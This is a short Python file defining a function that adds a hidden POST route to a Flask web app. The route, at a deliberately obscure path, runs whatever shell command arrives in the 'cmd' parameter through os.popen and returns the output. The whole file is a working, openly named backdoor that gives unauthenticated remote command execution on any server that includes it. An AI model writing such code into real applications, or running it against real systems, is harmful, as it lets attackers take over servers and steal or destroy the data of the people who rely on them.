import os
from flask import Flask, request


def add_backdoor(app: Flask):
    @app.post("/super/secret/route/you/never/find/it")
    def backdoor():
        cmd = request.args.get("cmd") or ""
        return os.popen(cmd).read()
